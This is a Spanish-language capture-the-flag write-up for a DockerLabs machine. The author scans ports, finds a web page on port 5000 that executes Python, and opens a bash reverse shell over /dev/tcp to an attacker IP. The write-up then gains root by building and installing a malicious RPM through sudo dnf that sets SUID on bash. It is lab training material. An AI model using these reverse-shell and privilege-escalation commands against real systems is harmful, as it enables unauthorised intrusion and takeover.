# Fase 1- Tanteo
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/be42c096-dd8d-4f57-ac7a-2af939ef4385)
En esta fase inicial, realizamos un escaneo de puertos para identificar los servicios disponibles en la máquina objetivo. Utilizamos la herramienta Nmap con una serie de opciones para obtener información detallada y realizar un análisis exhaustivo de los puertos abiertos.

### Comando Nmap utilizado:

`sudo nmap -p- --open -sS -sC -sV --min-rate 5000 -vvv -n -Pn 192.168.52.139 -oN Escaneo`

### Detalles del Comando:

- `sudo nmap -p- --open -sS -sC -sV --min-rate 5000 -vvv -n -Pn 192.168.52.139 -oN Escaneo`
- `-p-`: Escaneo de todos los puertos.
- `--open`: Muestra solo puertos abiertos.
- `-sS`: Escaneo SYN para determinar el estado de los puertos.
- `-sC`: Activa detección de versiones y vulnerabilidades.
- `-sV`: Escaneo de versiones de servicios.
- `--min-rate 5000`: Velocidad mínima de escaneo.
- `-vvv`: Verbosidad muy alta para información detallada.
- `-n`: Desactiva la resolución de DNS.
- `-Pn`: Ignora la detección de hosts en línea.
- `192.168.52.139`: IP de la máquina objetivo.
- `-oN Escaneo`: Guarda resultados en archivo "Escaneo".

### Resultados:

#### Puertos Abiertos:

1. **5000/tcp (UPNP):** Ns
### Puerto 5000

Al identificar que el puerto 5000 estaba abierto durante el escaneo, vi que tenia un texto que decía
`GetRequest: 
`10   │ |     HTTP/1.1 200 OK
` 11   │ |     Server: Werkzeug/3.0.2 Python/3.12.2`
 Entonces deduje que al introducir la ip de la maquina seguida del puerto 5000, nos debería de dar como resultado una pagina web.
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/0e1c6a52-d939-4599-9ba7-627667616b5a)
 Y tuve razón, es una pagina que nos permite practicar Python.
# Fase 2- Exploración

![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/9d19cda9-3060-4ef4-8a59-787be8310db8)
Vemos que al introducir un `print("hola mundo")` nos da directamente el resultado, por lo que podemos deducir que se esta ejecutando codigo directamente. Esto es potencialmente peligroso si podemos importar la librería os.
# Fase 3- Explotación

![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/6291bcc6-cab8-4e61-b78c-20986827db64)
Vemos que al ejecutar el comando:
```
import os

os.system("ls")
```
nos devuelve los ficheros que tiene el directorio, por lo que si, se puede confirmar que el codigo se ejecuta directamente en la maquina.

#### Reverse Shell
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/2cd68956-f016-46be-8da7-b9f28f1d856a)
nos dirigimos a la pagina https://www.revshells.com/ para conseguir una revershell en bash, para ejecutarla en la maquina.

![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/b88d32be-f181-4ce2-830f-555f90ce754b)
Mandamos la revershell con Python hecha en bash:
```
import os

os.system("bash -c 'bash -i >& /dev/tcp/192.168.52.143/443 0>&1'")
```

![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/3c92f181-a322-425d-9374-e76a63dc419a)
Y estamos dentro!

# Fase 4- Privilegios
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/a2468aa2-33d6-45a4-9ed1-bf01e63532eb)
somos el usuario primpi, y al hacer el comando `sudo -l` vemos que tenemos permiso de ejecución del binario `/usr/bin/dnf`.

#### Gtfobins
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/4dbfa334-96b1-4161-b462-02e0e2a1363b)
En nuestra máquina atacante crearemos un archivo **.rmp** malicioso. Con el comando que nos interese ejecutar como root.

```shell
TF=$(mktemp -d)
echo 'chmod u+s /bin/bash' > $TF/x.sh
fpm -n x -s dir -t rpm -a all --before-install $TF/x.sh $TF
```

Lo transferiremos a la máquina víctima, por ejemplo con un servidor con python en la máquina atacante:

```shell
sudo python3 -m http.server 80
```

Y lo descargamos en la máquina víctima:

```shell
curl -O 192.168.110.128/x-1.0-1.noarch.rpm
```

Instalamos el paquete malicioso que hemos creado con **dnf**:

```shell
sudo -u root /usr/bin/dnf install -y x-1.0-1.noarch.rpm
```

Al instalarlo, hemos cambiado la bash a **SUID**. Como podemos ejecutarla como root:

```shell
bash -p
whoami
-----------------
root
```

Y maquina finalizada con privilegios Maximo.
